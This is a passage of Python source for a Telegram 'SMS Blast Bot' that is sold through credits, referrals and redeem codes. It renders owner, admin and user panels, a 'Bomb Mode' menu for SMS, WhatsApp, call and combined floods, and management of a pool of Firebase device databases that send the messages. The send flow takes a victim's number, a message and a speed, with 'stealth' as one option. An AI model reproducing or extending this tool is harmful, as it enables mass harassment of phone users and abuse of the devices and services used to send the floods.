    for fb_id, fb_data in fb_items:
        if shown_count >= max_display:
            remaining = len(fb_items) - max_display
            fb_lines.append(f"  {em(EMOJI_STAR, '➕')} +{remaining} more firebase(s)...")
            break
        age = int(time.time() - fb_data.get("last_update", 0))
        status = em(EMOJI_CHECK, "🟢") if age < 60 else em(EMOJI_WARNING, "🟡") if age < 300 else em(EMOJI_CROSS, "🔴")
        fb_lines.append(f"  {status} {fb_data['label'][:20]}: {fb_data['online']} ᴏɴʟɪɴᴇ")
        shown_count += 1
    fb_summary = "\n".join(fb_lines) if fb_lines else f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴅᴀᴛᴀ"

    protected_count = len(PROTECTED_NUMBERS)

    total_s2 = stats.get('total_sent', 0)
    total_f2 = stats.get('total_failed', 0)
    total_ops2 = total_s2 + total_f2
    srate2 = f"{int(total_s2*100/total_ops2)}%" if total_ops2 > 0 else "—"
    return (
        f"🛡 <b>ADMIN PANEL</b> — {_VERSION}\n"
        f"{SEP_THICK}\n"
        f"👥  ᴜsᴇʀs    <b>{glow_num(len(users))}</b>  │  🚫 ʙᴀɴɴᴇᴅ <b>{len(banned)}</b>\n"
        f"📹  ᴍᴇᴅɪᴀ   <b>{len(videos)}</b>  │  🔥 ꜰʙ  <b>{len(d.get('firebases', []))}</b>\n"
        f"🔒  ᴘʀᴏᴛᴇᴄᴛ <b>{protected_count}</b>\n"
        f"{SEP_DOT}\n"
        f"📤  sᴇɴᴛ    <b>{glow_num(total_s2)}</b>  │  ❌ ꜰᴀɪʟ <b>{glow_num(total_f2)}</b>\n"
        f"🎯  ʀᴀᴛᴇ    <b>{srate2}</b>  │  🚀 ᴀᴄᴛɪᴠᴇ <b>{active_sessions}</b>\n"
        f"{SEP_DOT}\n"
        f"🔓  ᴀᴄᴄᴇss  {mode}\n"
        f"<b>📡 ꜰɪʀᴇʙᴀsᴇ sᴛᴀᴛᴜs:</b>\n{fb_summary}\n"
        f"🔄  sᴄᴀɴɴᴇʀ {scan_info}\n"
        f"{SEP_THICK}"
    )

def user_home_text(uid: int, d: dict) -> str:
    udata = d["users"].get(str(uid), {})
    fbs   = d.get("firebases", [])
    cred  = udata.get("credits", 0)
    uses  = udata.get("uses", 0)
    scan  = get_scan_status()
    name  = udata.get("name", "User")
    badge = tier_badge(uid, d)
    dev_tag = "<a href='https://t.me/ShownOfficial'>⏤͟͟͞͞ Sʜᴏᴡɴ</a>"
    cbar = mini_bar(min(cred, 100), 100, 10) if cred <= 100 else "▓" * 10
    return (
        f"╔══════════════════╗\n"
        f"║  💣 SMS BLAST BOT {_VERSION}  ║\n"
        f"╚══════════════════╝\n"
        f"{SEP_THIN}\n"
        f"👋 ᴡᴇʟᴄᴏᴍᴇ, <b>{name[:20]}</b>\n"
        f"{SEP_DOT}\n"
        f"🎖  ʀᴏʟᴇ      {badge}\n"
        f"💳  ᴄʀᴇᴅɪᴛs   <b>{cred}</b>  <code>{cbar}</code>\n"
        f"📤  ᴛᴏᴛᴀʟ sᴇɴᴛ <b>{glow_num(uses)}</b>\n"
        f"🔥  ғɪʀᴇʙᴀsᴇ  <b>{len(fbs)}</b> ᴅʙ(s) ᴀᴄᴛɪᴠᴇ\n"
        f"📡  sᴄᴀɴɴᴇʀ   {scan}\n"
        f"{SEP_THIN}\n"
        f"⚡ ᴛᴀᴘ <b>Sᴇɴᴅ SMS</b> ᴛᴏ ʙʟᴀsᴛ 🚀\n"
        f"💥 ᴛᴀᴘ <b>Bᴏᴍʙ Mᴏᴅᴇ</b> ꜰᴏʀ ᴡᴀ+ᴄᴀʟʟ\n"
        f"{SEP_DOT}\n"
        f"ᴅᴇᴠ: {dev_tag} 🥰"
    )
def owner_kb(d: dict) -> InlineKeyboardMarkup:
    mode_btn = (f"🔴 {sc('disable free mode')}", "owner:free:off") if d.get("free_mode") else (f"🟢 {sc('enable free mode')}", "owner:free:on")
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "owner:send", EMOJI_ROCKET, "📤"), btn("ᴍᴀɴᴀɢᴇ ғɪʀᴇʙᴀsᴇ", "owner:fb:menu:0", EMOJI_FIRE, "🔥")],
        [btn("ᴇxᴛʀᴀᴄᴛ ᴀᴄᴛɪᴠᴇ ғɪʀᴇʙᴀsᴇ", "owner:fb:extract_active", EMOJI_EXTRACT, "🔍"), btn("ᴀᴘɪ ᴍᴀɴᴀɢᴇʀ", "owner:api:menu", EMOJI_API, "🔌")],
        [btn("ᴍᴀɴᴀɢᴇ ᴍᴇᴅɪᴀ", "owner:videos:menu", EMOJI_VIDEO, "📹"), btn("ᴍᴀɴᴀɢᴇ sᴜᴘᴇʀ ᴀᴅᴍɪɴs", "owner:owners:menu", EMOJI_CROWN, "👑")],
        [btn("ᴍᴀɴᴀɢᴇ ᴀᴅᴍɪɴs", "owner:admins:menu", EMOJI_SHIELD, "🛡"), btn("ᴠɪᴇᴡ ᴜsᴇʀs", "owner:users:list", EMOJI_STAR, "👥")],
        [btn("ʙᴀɴ ᴜsᴇʀ", "owner:ban", EMOJI_CROSS, "🚫"), btn("ᴜɴʙᴀɴ ᴜsᴇʀ", "owner:unban:menu", EMOJI_CHECK, "✅")],
        [btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "owner:broadcast", EMOJI_BELL, "📢"), btn("ᴀᴘɪ sᴛᴀᴛs", "owner:stats", EMOJI_STAR, "📊")],
        [btn("ᴀᴄᴛɪᴠɪᴛɪ ʟᴏɢ", "owner:activity", EMOJI_GEAR, "📜"), btn("ᴘʀɪᴄɪɴɢ ᴘʟᴀɴs", "owner:pricing:menu", EMOJI_MONEY, "💳")],
        [btn("ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇs", "owner:redeem:menu", EMOJI_GIFT, "🎁"), btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs", "owner:credits:add", EMOJI_MONEY, "💰")],
        [btn("ᴅᴇᴅᴜᴄᴛ ᴄʀᴇᴅɪᴛs", "owner:credits:deduct", EMOJI_CROSS, "💰"), btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs ᴀʟʟ", "owner:add_all_credits", EMOJI_MONEY, "💰")],
        [btn("ᴅᴇᴅᴜᴄᴛ ᴀʟʟ", "owner:deduct_all_credits", EMOJI_CROSS, "💰"), btn("ғᴏʀᴄᴇ ᴊᴏɪɴ", "owner:fj:menu", EMOJI_BELL, "🔗")],
        [btn("sᴇᴛᴛɪɴɢs", "owner:settings", EMOJI_GEAR, "⚙️"), btn("sᴍs ʜɪsᴛᴏʀʏ", "owner:sms_history", EMOJI_STAR, "📋")],
        [btn("ᴇxᴘᴏʀᴛ sᴄʀɪᴘᴛ", "owner:export_script", EMOJI_GEAR, "📤"), btn("ᴘʀᴏᴛᴇᴄᴛ ɴᴜᴍʙᴇʀ", "owner:protect", EMOJI_LOCK, "🔒")],
        [btn("ᴘʀᴏᴛᴇᴄᴛᴇᴅ ʟɪsᴛ", "owner:protected_list", EMOJI_LOCK, "🔐"), btn("ᴛʀᴀᴄᴋ ɴᴜᴍʙᴇʀ", "owner:track", EMOJI_STAR, "📊")],
        [btn("ʙᴀᴄᴋᴜᴘ ᴍᴀɴᴀɢᴇʀ", "owner:backup:menu", EMOJI_GEAR, "📦"), btn("ᴍᴏɴɪᴛᴏʀ", "owner:monitor", EMOJI_STAR, "📡")],
        [InlineKeyboardButton(text=mode_btn[0], callback_data=mode_btn[1])],
        [btn("Refresh", "owner:refresh", EMOJI_GEAR, "🔄")],
        switch_row(),
    ])

def admin_kb(d: dict) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("Send SMS", "admin:send", EMOJI_ROCKET, "📤", style="success"), btn("Manage Media", "owner:videos:menu", EMOJI_VIDEO, "📹", style="primary")],
        [btn("View Users", "admin:users:list", EMOJI_STAR, "👥", style="primary"), btn("API Stats", "admin:stats", EMOJI_STAR, "📊", style="primary")],
        [btn("Ban User", "admin:ban", EMOJI_CROSS, "🚫", style="danger"), btn("Unban User", "admin:unban:menu", EMOJI_CHECK, "✅", style="success")],
        [btn("Broadcast", "admin:broadcast", EMOJI_BELL, "📢", style="primary")],
        [btn("Refresh", "admin:refresh", EMOJI_GEAR, "🔄", style="primary")],
        switch_row(),
    ])

def user_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        # PRIMARY ACTIONS
        [btn("📤 Sᴇɴᴅ SMS", "user:send", "6203911118964924015", "📤", style="success"),
         btn("💥 Bᴏᴍʙ Mᴏᴅᴇ", "user:bomb:menu", EMOJI_BOMB, "💥", style="danger")],
        # ECONOMY
        [btn("💳 Cʀᴇᴅɪᴛs", "user:credits", "5326049357332513437", "💳", style="primary"),
         btn("💰 Bᴜʏ", "user:pricing", "6120628756747919945", "💰", style="success")],
        [btn("🎁 Rᴇᴅᴇᴇᴍ", "user:redeem", "6197500339109763704", "🎁", style="primary"),
         btn("💸 Tʀᴀɴsꜰᴇʀ", "user:transfer", "6120713655366455614", "💸", style="primary")],
        # SOCIAL
        [btn("👥 Rᴇꜰᴇʀ & Eᴀʀɴ", "user:refer", EMOJI_STAR, "👥", style="primary")],
        # STATS / INFO
        [btn("📊 Sᴛᴀᴛs", "user:stats", "6104690120227559861", "📊", style="primary"),
         btn("📜 Hɪsᴛᴏʀʏ", "user:sms_history", "5231264265242954153", "📜", style="primary")],
        [btn("ℹ️ Iɴꜰᴏ", "user:info", "5359454053887670307", "ℹ️", style="primary")],
        switch_row(),
    ])

def bomb_mode_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("📱 SMS Bᴏᴍʙ", "user:bomb:sms", EMOJI_SMS, "📱", style="primary"),
         btn("💚 WʜᴀᴛsAᴘᴘ", "user:bomb:wa", EMOJI_WHATSAPP, "💚", style="success")],
        [btn("📞 Cᴀʟʟ Bᴏᴍʙ", "user:bomb:call", EMOJI_CALL, "📞", style="danger"),
         btn("💥 ALL Cᴏᴍʙɪɴᴇᴅ", "user:bomb:all", EMOJI_BOMB, "💥", style="danger")],
        [btn("❌ Cᴀɴᴄᴇʟ", "user:home", EMOJI_CROSS, "❌", style="danger")],
        switch_row(),
    ])

def videos_menu_kb(d: dict) -> InlineKeyboardMarkup:
    videos = d.get("videos", [])
    rows = [
        [btn("ᴀᴅᴅ ᴍᴇᴅɪᴀ (ᴘʜᴏᴛᴏ/ᴠɪᴅᴇᴏ)", "owner:videos:add", EMOJI_CHECK, "➕")],
        [btn("🗑 ʙᴜʟᴋ ᴅᴇʟᴇᴛᴇ ᴀʟʟ ᴍᴇᴅɪᴀ", "owner:videos:bulk_del", EMOJI_CROSS, "🗑")]
    ]
    for idx, item in enumerate(videos, 1):
        if isinstance(item, dict):
            m_type = item.get("type", "video")
            spoiler = item.get("spoiler", False)
        else:
            m_type = "video"
            spoiler = False
        icon = "🖼" if m_type == "photo" else "📹"
        spoiler_tag = " 🙈" if spoiler else ""
        label = f"{icon} #{idx}{spoiler_tag}"
        rows.append([btn(label, "noop", EMOJI_VIDEO, icon), btn("ʀᴇᴍᴏᴠᴇ", f"owner:videos:del:{idx-1}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def fb_menu_kb(d: dict, page: int = 0) -> InlineKeyboardMarkup:
    fbs = d.get("firebases", [])
    per_page = 8
    total_pages = max(1, (len(fbs) + per_page - 1) // per_page)
    page = max(0, min(page, total_pages - 1))

    start_idx = page * per_page
    end_idx = start_idx + per_page
    current_fbs = fbs[start_idx:end_idx]

    rows = [
        [
            btn("ᴀᴅᴅ ғɪʀᴇʙᴀsᴇ", "owner:fb:add", EMOJI_CHECK, "➕"),
            btn("📁 ᴀᴅᴅ ᴠɪᴀ ᴛxᴛ", "owner:fb:add_file", EMOJI_CHECK, "📄")
        ],
        [
            btn("ᴀᴅᴅ ᴏɴʟʏ ᴀᴄᴛɪᴠᴇ", "owner:fb:add_active", EMOJI_CHECK, "✅", style="success"),
            btn("ʀᴇᴍᴏᴠᴇ ᴅᴇᴀᴅ", "owner:fb:remove_dead", EMOJI_CROSS, "🗑", style="danger")
        ],
        [
            btn("ᴀᴄᴛɪᴠᴇ ᴠɪᴀ ᴛxᴛ", "owner:fb:add_active_file", EMOJI_CHECK, "📄", style="success")
        ]
    ]
    for fb in current_fbs:
        label = fb.get("label", fb["url"].replace("https://", ""))
        if len(label) > 16:
            label = label[:14] + ".."
        rows.append([
            btn(label, "noop", EMOJI_FIRE, "🔥"),
            btn("ʀᴇᴍᴏᴠᴇ", f"owner:fb:del:{fb['id']}:{page}", EMOJI_CROSS, "🗑")
        ])

    nav_row = []
    if page > 0:
        nav_row.append(btn("◀️ ᴘʀᴇᴠ", f"owner:fb:menu:{page-1}", EMOJI_GEAR, "◀️"))
    if page < total_pages - 1:
        nav_row.append(btn("ɴᴇxᴛ ▶️", f"owner:fb:menu:{page+1}", EMOJI_GEAR, "▶️"))
    if nav_row:
        rows.append(nav_row)

    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def backup_menu_kb(d: dict) -> InlineKeyboardMarkup:
    cfg = d.get("backup", DEFAULT_BACKUP)
    en = cfg.get("enabled", True)
    toggle_label = "🔴 Disable Auto" if en else "🟢 Enable Auto"
    toggle_data = "owner:backup:off" if en else "owner:backup:on"
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("ʙᴀᴄᴋᴜᴘ ɴᴏᴡ", "owner:backup:now", EMOJI_GEAR, "📦", style="success")],
        [btn("sᴇᴛ ᴄʜᴀᴛ ɪᴅ", "owner:backup:set_chat", EMOJI_BELL, "🔗"), btn("sᴇᴛ ɪɴᴛᴇʀᴠᴀʟ", "owner:backup:set_interval", EMOJI_GEAR, "⏱")],
        [InlineKeyboardButton(text=sc(toggle_label), callback_data=toggle_data)],
        [btn("ᴇxᴘᴏʀᴛ ᴊsᴏɴ", "owner:backup:export_json", EMOJI_GEAR, "📤"), btn("ᴇxᴘᴏʀᴛ sǫʟɪᴛᴇ", "owner:backup:export_sqlite", EMOJI_GEAR, "📤")],
        [btn("ɪᴍᴘᴏʀᴛ ᴊsᴏɴ", "owner:backup:import_json", EMOJI_CHECK, "📥")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")],
    ])

def owners_menu_kb(d: dict) -> InlineKeyboardMarkup:
    owners = d.get("owners", [])
    rows = []
    if len(owners) < 6:
        rows.append([btn("ᴀᴅᴅ sᴜᴘᴇʀ ᴀᴅᴍɪɴ", "owner:owners:add", EMOJI_CHECK, "➕")])
    for oid in owners:
        if oid == MAIN_OWNER:
            rows.append([btn(f"{oid} (ᴍᴀɪɴ)", "noop", EMOJI_CROWN, "👑")])
        else:
            rows.append([btn(f"{oid}", "noop", EMOJI_CROWN, "🔱"), btn("ʀᴇᴍᴏᴠᴇ", f"owner:owners:del:{oid}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def admins_menu_kb(d: dict) -> InlineKeyboardMarkup:
    admins = d.get("admins", [])
    rows = [[btn("ᴀᴅᴅ ᴀᴅᴍɪɴ", "owner:admins:add", EMOJI_CHECK, "➕")]]
    for aid in admins:
        rows.append([btn(f"{aid}", "noop", EMOJI_SHIELD, "🛡"), btn("ʀᴇᴍᴏᴠᴇ", f"owner:admins:del:{aid}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def unban_menu_kb(d: dict, prefix: str) -> InlineKeyboardMarkup:
    banned = d.get("banned", [])
    rows = []
    for bid in banned:
        rows.append([btn(f"{bid}", f"{prefix}:unban:do:{bid}", EMOJI_CHECK, "🔓")])
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def users_list_kb(d: dict, prefix: str, page: int = 0) -> tuple:
    users = d.get("users", {})
    items = list(users.items())
    per = 10
    start = page * per
    chunk = items[start:start + per]
    approved = d.get("approved", [])
    banned = d.get("banned", [])

    lines = [f"{em(EMOJI_STAR, '👥')} <b>{sc('users')} ({len(items)} ᴛᴏᴛᴀʟ)</b>\n"]
    for uid_str, udata in chunk:
        uid = int(uid_str)
        name = udata.get("name", "Unknown")
        uses = udata.get("uses", 0)
        credits = udata.get("credits", 0)
        if uid in banned: status = em(EMOJI_CROSS, "🚫")
        elif uid in approved: status = em(EMOJI_CHECK, "✅")
        elif is_owner(uid, d): status = em(EMOJI_CROWN, "👑")
        elif uid in d["admins"]: status = em(EMOJI_SHIELD, "🛡")
        else: status = em(EMOJI_STAR, "👤")
        lines.append(f"{status} <code>{uid}</code> — {name[:18]} | {em(EMOJI_MONEY, '💰')}{credits} | {em(EMOJI_CHECK, '📤')}{uses}")

    text = "\n".join(lines)
    rows = []
    nav = []
    if page > 0: nav.append(btn("◀️ ᴘʀᴇᴠ", f"{prefix}:users:pg:{page-1}", EMOJI_GEAR, "◀️"))
    if start + per < len(items): nav.append(btn("ɴᴇxᴛ ▶️", f"{prefix}:users:pg:{page+1}", EMOJI_GEAR, "▶️"))
    if nav: rows.append(nav)
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙")])
    return text, InlineKeyboardMarkup(inline_keyboard=rows)

def api_stats_text(d: dict) -> str:
    stats = d.get("stats", {})
    api_use = stats.get("api_usage", {})
    fbs = {fb["id"]: fb for fb in d.get("firebases", [])}

    ts = stats.get('total_sent', 0)
    tf = stats.get('total_failed', 0)
    to = ts + tf
    lines = [
        f"📊 <b>API STATS</b>",
        f"{SEP_THICK}",
        f"📤  Tᴏᴛᴀʟ Sᴇɴᴛ   <b>{glow_num(ts)}</b>",
        f"❌  Tᴏᴛᴀʟ Fᴀɪʟᴇᴅ <b>{glow_num(tf)}</b>",
        f"🎯  Sᴜᴄᴄᴇss Rᴀᴛᴇ  <b>{int(ts*100/to) if to>0 else 0}%</b>",
        f"{SEP_DOT}",
        f"<b>📡 Per Firebase:</b>",
    ]
    if not api_use:
        lines.append(f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴜsᴀɢᴇ ʏᴇᴛ.")
    for fb_id, fb_stats in api_use.items():
        fb = fbs.get(fb_id)
        label = fb.get("label", fb_id[:20]) if fb else fb_id[:20]
        label = label.replace("<", "&lt;").replace(">", "&gt;").replace("&", "&amp;")
        sent = fb_stats.get("sent", 0)
        failed = fb_stats.get("failed", 0)
        lines.append(f"{em(EMOJI_FIRE, '🔥')} {label}\n   {em(EMOJI_CHECK, '✅')} {sent} sᴇɴᴛ  {em(EMOJI_CROSS, '❌')} {failed} ғᴀɪʟᴇᴅ")
    return "\n".join(lines)

def json_to_sqlite_bytes(d: dict) -> bytes:
    """Convert current DB dict into an in-memory SQLite dump."""
    conn = sqlite3.connect(":memory:")
    cur = conn.cursor()
    cur.execute("CREATE TABLE meta (k TEXT PRIMARY KEY, v TEXT)")
    cur.execute("INSERT INTO meta VALUES (?, ?)", ("version", _VERSION))
    cur.execute("INSERT INTO meta VALUES (?, ?)", ("exported_at", datetime.now().isoformat()))

    cur.execute("CREATE TABLE users (uid TEXT PRIMARY KEY, data TEXT)")
    for uid_str, udata in d.get("users", {}).items():
        cur.execute("INSERT INTO users VALUES (?, ?)", (uid_str, json.dumps(udata, ensure_ascii=False)))

    cur.execute("CREATE TABLE firebases (id TEXT PRIMARY KEY, data TEXT)")
    for fb in d.get("firebases", []):
        cur.execute("INSERT INTO firebases VALUES (?, ?)", (fb.get("id"), json.dumps(fb, ensure_ascii=False)))

    cur.execute("CREATE TABLE settings (k TEXT PRIMARY KEY, v TEXT)")
    for key in ("owners", "admins", "banned", "approved", "free_mode", "force_join",
                "pricing", "redeem_codes", "settings", "stats", "videos", "backup",
                "protected_numbers", "sms_history", "activity_log", "premium"):
        if key in d:
            cur.execute("INSERT INTO settings VALUES (?, ?)", (key, json.dumps(d[key], ensure_ascii=False)))

    # dump to bytes
    mem = io.BytesIO()
    for line in conn.iterdump():
        mem.write((line + "\n").encode("utf-8"))
    conn.close()
    return mem.getvalue()

R = Router()

# ===================== START / HOME =====================

@R.message(CommandStart(deep_link=True))
async def cmd_start_deep(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))

    name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"

    def _reg(d):
        return reg_user(uid, name, d)

    is_new = atomic_update(_reg)

    if is_new:
        log_text = (
            f"🆕 <b>NEW USER JOINED</b>\n\n"
            f"👤 <b>Name:</b> {name}\n"
            f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
            f"🌐 <b>Username:</b> {username}\n"
            f"📅 <b>Time:</b> <code>{fmt_time(int(time.time()))}</code>"
        )
        asyncio.create_task(send_channel_log(msg.bot, log_text))

    args = msg.text.split()
    code = args[1] if len(args) > 1 else ""

    redeem_notice = ""
    if code.startswith("RDM"):
        redeem_code = code[3:]
        status, credits = do_redeem_code(uid, redeem_code)
        if status == "ok":
            redeem_notice = f"\n\n{em(EMOJI_GIFT, '🎉')} <b>Redeem Successful!</b> +{credits} credits added!"
        elif status == "expired":
            redeem_notice = f"\n\n{em(EMOJI_CROSS, '❌')} Ye redeem code expire ho gaya hai!"
        elif status == "used":
            redeem_notice = f"\n\n{em(EMOJI_CROSS, '❌')} Aap pehle se ye code use kar chuke hain!"
        elif status == "invalid":
            redeem_notice = f"\n\n{em(EMOJI_CROSS, '❌')} Invalid redeem code!"

    if code.startswith("REF"):
        d = load()
        if not d["users"].get(str(uid), {}).get("referred_by"):
            success, msg_text, referrer = process_referral(uid, code, d)
            if success and referrer:
                try:
                    ref_name = d["users"].get(str(uid), {}).get("name", "Someone")
                    await msg.bot.send_message(
                        referrer,
                        q(
                            f"{em(EMOJI_GIFT, '🎉')} <b>{ref_name}</b> ne aapka referral code use kiya!\n"
                            f"{em(EMOJI_MONEY, '💰')} Aapko +{d['settings']['ref_credits']} credits mile hain.\n"
                            f"{em(EMOJI_MONEY, '💰')} Unko bhi +{d['settings']['ref_credits']} credits mile hain."
                        ),
                        parse_mode="HTML"
                    )
                except Exception:
                    pass

    d = load()

    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(q(force_join_text(missing)), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return

    if redeem_notice:
        await msg.answer(q(redeem_notice.strip()), parse_mode="HTML")

    if is_owner(uid, d):
        await send_media_with_caption(msg.bot, msg.chat.id, d, owner_panel_text(d), owner_kb(d))
        return
    if is_admin(uid, d):
        await send_media_with_caption(msg.bot, msg.chat.id, d, admin_panel_text(d), admin_kb(d))
        return
    if is_banned(uid, d):
        await msg.answer(q(f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>\nAdmin se contact karein."), parse_mode="HTML")
        return
    if not can_use(uid, d):
        await msg.answer(q(f"{em(EMOJI_CROSS, '⛔')} <b>Access nahi hai!</b>\n\nOwner se approval lein. Sahilxalone.t.me "), parse_mode="HTML")
        return

    await send_media_with_caption(msg.bot, msg.chat.id, d, user_home_text(uid, d), user_kb())

@R.message(Command("start"))
async def cmd_start(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))

    name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
    d = load()
    is_new = reg_user(uid, name, d)
    save(d)

    if is_new:
        log_text = (
            f"🆕 <b>NEW USER JOINED</b>\n\n"
            f"👤 <b>Name:</b> {name}\n"
            f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
            f"🌐 <b>Username:</b> {username}\n"
            f"📅 <b>Time:</b> <code>{fmt_time(int(time.time()))}</code>"
        )
        asyncio.create_task(send_channel_log(msg.bot, log_text))

    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(q(force_join_text(missing)), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return

    if is_banned(uid, d):
        await msg.answer(q(f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>\nAdmin se contact karein."), parse_mode="HTML")
        return
    if not can_use(uid, d) and not is_owner(uid, d) and not is_admin(uid, d):
        await msg.answer(q(f"{em(EMOJI_CROSS, '⛔')} <b>Access nahi hai!</b>\n\nOwner se approval lein."), parse_mode="HTML")
        return

    # Default: Reply keyboard mode (no inline panel on /start)
    role = "Owner" if is_owner(uid, d) else ("Admin" if is_admin(uid, d) else "User")
    header = (
        f"{em(EMOJI_ROCKET, '🚀')} <b>{pf('welcome')} — {role}</b>\n\n"
        f"{em(EMOJI_STAR, '📱')} SMS Blast Bot {_VERSION}\n"
        f"Reply keyboard se start karo, ya <b>Switch to Inline</b> dabao."
    )
    await show_reply(msg.bot, msg.chat.id, uid, header, default_reply_keyboard())

@R.callback_query(F.data == "fj:check")
async def fj_check(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("❌ Abhi bhi join nahi kiya!", show_alert=True)
        try:
            await safe_edit(cq.message, force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        except Exception:
            pass
        return

    await cq.answer("✅ Verified!", show_alert=True)

    if is_owner(uid, d):
        await send_media_with_caption(cq.bot, cq.message.chat.id, d, owner_panel_text(d), owner_kb(d))
    elif is_admin(uid, d):
        await send_media_with_caption(cq.bot, cq.message.chat.id, d, admin_panel_text(d), admin_kb(d))
    else:
        await send_media_with_caption(cq.bot, cq.message.chat.id, d, user_home_text(uid, d), user_kb())

# ===================== USER SEND FLOW =====================

@R.callback_query(F.data == "user:send")
async def user_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id

    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("⛔ Force Join compulsory hai!", show_alert=True)
        await safe_edit(cq.message, force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return

    if not can_use(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True)
        return
    await state.set_state(S.send_number)
    await safe_edit(cq.message,
        f"📞 <b>STEP 1 / 4 — Tᴀʀɢᴇᴛ Nᴜᴍʙᴇʀ</b>\n"
        f"{SEP_THIN}\n"
        f"Jis number pe SMS bhejna hai woh enter karo\n"
        f"<code>Format: +91XXXXXXXXXX</code>\n"
        f"{SEP_DOT}\n"
        f"<i>💡 Example: +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.send_number)
async def user_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):"), parse_mode="HTML")
        return

    if number in PROTECTED_NUMBERS:
        await msg.answer(
            q(
                f"{em(EMOJI_LOCK, '🔒')} <b>Ye number protected hai!</b>\n\n"
                f"Sirf Owner/Super Admin is number pe SMS bhej sakte hain."
            ),
            parse_mode="HTML"
        )
        return

    await state.update_data(number=number)
    await state.set_state(S.send_message)
    await msg.answer(
        q(
            f"{em(EMOJI_CHECK, '✅')} Number: <code>{mask_number(number)}</code>\n\n"
            f"💬 <b>STEP 2 / 4 — Mᴇssᴀɢᴇ</b>\n"
            f"{SEP_THIN}\n"
            f"Jo message bhejna hai woh type karo:\n"
            f"<i>💡 Yeh text SMS mein jayega</i>"
        ),
        reply_markup=kb([(f"{sc('cancel')}", "user:cancel")]),
        parse_mode="HTML"
    )

@R.message(S.send_message)
async def user_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.send_speed)
    await msg.answer(
        q(
            f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
            f"⚡ <b>STEP 3 / 4 — Sᴘᴇᴇᴅ Sᴇʟᴇᴄᴛ</b>\n"
            f"{SEP_THIN}\n"
            f"Kitni speed mein bhejein?\n"
            f"<i>🚀 Fast = max power | 🐢 Slow = stealth</i>"
        ),
        reply_markup=speed_kb("user"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"user:speed:fast", "user:speed:medium", "user:speed:slow"}))
async def user_speed_selected(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id

    speed_map = {
        "user:speed:fast": SPEED_FAST,
        "user:speed:medium": SPEED_MEDIUM,
        "user:speed:slow": SPEED_SLOW
    }
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"

    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.send_count)

    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)
    count = len(devices)

    credit_info = ""
    if not is_admin(uid, d) and not is_owner(uid, d):
        user_credits = get_user_credits(uid, d)
